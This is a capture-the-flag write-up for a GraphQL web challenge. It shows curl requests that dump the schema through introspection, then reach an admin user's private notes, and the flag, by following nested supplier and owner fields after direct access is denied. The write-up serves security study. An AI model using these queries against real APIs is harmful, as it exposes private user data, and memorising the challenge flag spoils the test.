# Brunner's Bakery

```
Difficulty: Medium
Author: Quack

Recent Graphs show that we need some more Quality of Life recipes! Can you go check if the bakery is hiding any?!
https://brunner-s-bakery.challs.brunnerne.xyz
```

We are provided with a GraphQL endpoint:

```shell
$ curl 'https://brunner-s-bakery.challs.brunnerne.xyz/graphql' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Referer: https://brunner-s-bakery.challs.brunnerne.xyz/' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://brunner-s-bakery.challs.brunnerne.xyz' \
  -H 'Sec-GPC: 1' \
  -H 'Connection: keep-alive' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Priority: u=4' \
  -H 'TE: trailers' \
  --data-raw '{"query":"query { publicRecipes { name description author { displayName } ingredients { name } } }"}'
{"data":{"publicRecipes":[{"name":"Lemon Drizzle","description":"A zesty lemon drizzle cake for the window display.","author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Flour"},{"name":"Sugar"}]},{"name":"Vanilla Dream","description":"A classic vanilla sponge with a creamy frosting.","author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Vanilla Beans"},{"name":"Butter"}]},{"name":"Chocolate Indulgence","description":"A rich chocolate cake with a molten center.","author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Dark Chocolate"},{"name":"Eggs"}]},{"name":"Berry Bliss","description":"A delightful berry tart with a buttery crust.","author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Mixed Berries"},{"name":"Pastry Flour"}]},{"name":"Caramel Crunch","description":"A crunchy caramel tart with a hint of sea salt.","author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Caramel Sauce"},{"name":"Sea Salt"}]},{"name":"Nutty Delight","description":"A nutty cake with a rich cream cheese frosting.","author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Mixed Nuts"},{"name":"Cream Cheese"}]},{"name":"Gasp of the Pumpkin Bet","description":"A seasonal favorite with a spiced pumpkin filling.","author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Pumpkin Puree"},{"name":"Spices"}]}]}}
```

Find GraphQL schema:

```shell
curl 'https://brunner-s-bakery.challs.brunnerne.xyz/graphql' \
                                              -X POST \
                                              -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0' \
                                              -H 'Accept: */*' \
                                              -H 'Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3' \
                                              -H 'Accept-Encoding: gzip, deflate, br, zstd' \
                                              -H 'Referer: https://brunner-s-bakery.challs.brunnerne.xyz/' \
                                              -H 'Content-Type: application/json' \
                                              -H 'Origin: https://brunner-s-bakery.challs.brunnerne.xyz' \
                                              -H 'Sec-GPC: 1' \
                                              -H 'Connection: keep-alive' \
                                              -H 'Sec-Fetch-Dest: empty' \
                                              -H 'Sec-Fetch-Mode: cors' \
                                              -H 'Sec-Fetch-Site: same-origin' \
                                              -H 'Priority: u=4' \
                                              -H 'TE: trailers' \
                                              --data-raw '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}' | jq > schema.json
```

Found that we cannot read secret recipes: 

```shell
$ curl ...
                                              --data-raw '{"query":"query { secretRecipes { name description author { displayName } ingredients { name } } }"}'
{"errors":[{"message":"Access denied. admin only.","locations":[{"line":1,"column":9}],"path":["secretRecipes"],"extensions":{"code":"UNAUTHENTICATED","exception":{"stacktrace":["AuthenticationError: Access denied. admin only.","    at Object.secretRecipes (/app/server.js:213:15)","    at field.resolve (/app/node_modules/apollo-server-core/dist/utils/schemaInstrumentation.js:56:26)","    at executeField (/app/node_modules/graphql/execution/execute.js:500:20)","    at executeFields (/app/node_modules/graphql/execution/execute.js:422:22)","    at executeOperation (/app/node_modules/graphql/execution/execute.js:352:14)","    at execute (/app/node_modules/graphql/execution/execute.js:136:20)","    at execute (/app/node_modules/apollo-server-core/dist/requestPipeline.js:207:48)","    at processGraphQLRequest (/app/node_modules/apollo-server-core/dist/requestPipeline.js:150:34)","    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)","    at async processHTTPRequest (/app/node_modules/apollo-server-core/dist/runHttpQuery.js:222:30)"]}}}],"data":null}
```

But we can extract more data from the public recipes via `publicRecipes.ingredients.supplier.owner.privateNotes`:

```shell
$ curl ...
                                              --data-raw '{"query":"query { publicRecipes { id name description isSecret author { displayName } ingredients { name supplier { id name owner { id username privateNotes } } } } }"}'
{"data":{"publicRecipes":[{"id":"r1","name":"Lemon Drizzle","description":"A zesty lemon drizzle cake for the window display.","isSecret":false,"author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Flour","supplier":{"id":"s2","name":"Golden Eggs Ltd","owner":{"id":"u3","username":"junior_baker","privateNotes":null}}},{"name":"Sugar","supplier":{"id":"s1","name":"Heavenly Sugar Co","owner":{"id":"u4","username":"grandmaster_brunner","privateNotes":"brunner{Gr4phQL_1ntR0sp3ct10n_G035_R0UnD_4Nd_r0uND}"}}}]},{"id":"r2","name":"Vanilla Dream","description":"A classic vanilla sponge with a creamy frosting.","isSecret":false,"author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Vanilla Beans","supplier":{"id":"s1","name":"Heavenly Sugar Co","owner":{"id":"u4","username":"grandmaster_brunner","privateNotes":"brunner{Gr4phQL_1ntR0sp3ct10n_G035_R0UnD_4Nd_r0uND}"}}},{"name":"Butter","supplier":{"id":"s2","name":"Golden Eggs Ltd","owner":{"id":"u3","username":"junior_baker","privateNotes":null}}}]},{"id":"r3","name":"Chocolate Indulgence","description":"A rich chocolate cake with a molten center.","isSecret":false,"author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Dark Chocolate","supplier":{"id":"s1","name":"Heavenly Sugar Co","owner":{"id":"u4","username":"grandmaster_brunner","privateNotes":"brunner{Gr4phQL_1ntR0sp3ct10n_G035_R0UnD_4Nd_r0uND}"}}},{"name":"Eggs","supplier":{"id":"s2","name":"Golden Eggs Ltd","owner":{"id":"u3","username":"junior_baker","privateNotes":null}}}]},{"id":"r4","name":"Berry Bliss","description":"A delightful berry tart with a buttery crust.","isSecret":false,"author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Mixed Berries","supplier":{"id":"s1","name":"Heavenly Sugar Co","owner":{"id":"u4","username":"grandmaster_brunner","privateNotes":"brunner{Gr4phQL_1ntR0sp3ct10n_G035_R0UnD_4Nd_r0uND}"}}},{"name":"Pastry Flour","supplier":{"id":"s2","name":"Golden Eggs Ltd","owner":{"id":"u3","username":"junior_baker","privateNotes":null}}}]},{"id":"r5","name":"Caramel Crunch","description":"A crunchy caramel tart with a hint of sea salt.","isSecret":false,"author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Caramel Sauce","supplier":{"id":"s1","name":"Heavenly Sugar Co","owner":{"id":"u4","username":"grandmaster_brunner","privateNotes":"brunner{Gr4phQL_1ntR0sp3ct10n_G035_R0UnD_4Nd_r0uND}"}}},{"name":"Sea Salt","supplier":{"id":"s2","name":"Golden Eggs Ltd","owner":{"id":"u3","username":"junior_baker","privateNotes":null}}}]},{"id":"r6","name":"Nutty Delight","description":"A nutty cake with a rich cream cheese frosting.","isSecret":false,"author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Mixed Nuts","supplier":{"id":"s1","name":"Heavenly Sugar Co","owner":{"id":"u4","username":"grandmaster_brunner","privateNotes":"brunner{Gr4phQL_1ntR0sp3ct10n_G035_R0UnD_4Nd_r0uND}"}}},{"name":"Cream Cheese","supplier":{"id":"s2","name":"Golden Eggs Ltd","owner":{"id":"u3","username":"junior_baker","privateNotes":null}}}]},{"id":"r7","name":"Gasp of the Pumpkin Bet","description":"A seasonal favorite with a spiced pumpkin filling.","isSecret":false,"author":{"displayName":"Sally Sweet"},"ingredients":[{"name":"Pumpkin Puree","supplier":{"id":"s1","name":"Heavenly Sugar Co","owner":{"id":"u4","username":"grandmaster_brunner","privateNotes":"brunner{Gr4phQL_1ntR0sp3ct10n_G035_R0UnD_4Nd_r0uND}"}}},{"name":"Spices","supplier":{"id":"s2","name":"Golden Eggs Ltd","owner":{"id":"u3","username":"junior_baker","privateNotes":null}}}]}]}}
```

Get flag: `brunner{Gr4phQL_1ntR0sp3ct10n_G035_R0UnD_4Nd_r0uND}`.
